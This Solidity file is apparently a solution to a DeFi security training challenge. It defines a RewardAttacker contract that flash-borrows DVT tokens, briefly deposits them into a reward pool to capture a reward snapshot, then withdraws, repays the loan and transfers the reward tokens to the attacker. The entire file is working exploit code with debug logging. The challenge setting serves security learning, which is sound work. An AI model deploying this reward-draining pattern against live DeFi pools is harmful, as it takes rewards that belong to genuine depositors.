// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

pragma solidity ^0.8.0;
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;    
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;        
}

contract RewardAttacker {

    address immutable public flashPool;
    address immutable public rewardPool;
    address immutable public dvt;
    address immutable public rvd;
    
    constructor(
        address pool, 
        address rewarder, 
        address dvtAddr,
        address rvdAddr
        )
    {
        flashPool = pool;
        rewardPool = rewarder;
        dvt = dvtAddr;
        rvd = rvdAddr;
    }

    function startFlashLoan(uint256 amount) public {        
        console.log("STARTING FLASH :::", amount);
        IFlashLoanerPool(flashPool).flashLoan(amount);
        
        // Give reward tokens to the attacker
        uint256 rvdAmount = IERC20(rvd).balanceOf(address(this));
        IERC20(rvd).transfer(msg.sender, rvdAmount);
    }

    function receiveFlashLoan(uint256 amount) external {        
        require(msg.sender == flashPool, "Only Flash pool can call this function");        
        console.log("RECEIVING      :::", amount);

        // Approve (add allowance)
        IERC20(dvt).approve(rewardPool, amount);        
        console.log("APPROVED       :::", amount, dvt);

        // Deposit
        console.log("DEPOSIT        :::", amount, rewardPool);
        ITheRewarderPool(rewardPool).deposit(amount);        

        // Witddraw your LTV BACK!!
        ITheRewarderPool(rewardPool).withdraw(amount);        
        console.log("ATCKER DVT BAL :::", IERC20(dvt).balanceOf(msg.sender));

        // return the Flash loan (no fee, just the original amount)        
        IERC20(dvt).transfer(flashPool, amount);        
        console.log("RETURN         :::", amount, dvt);        

    }
}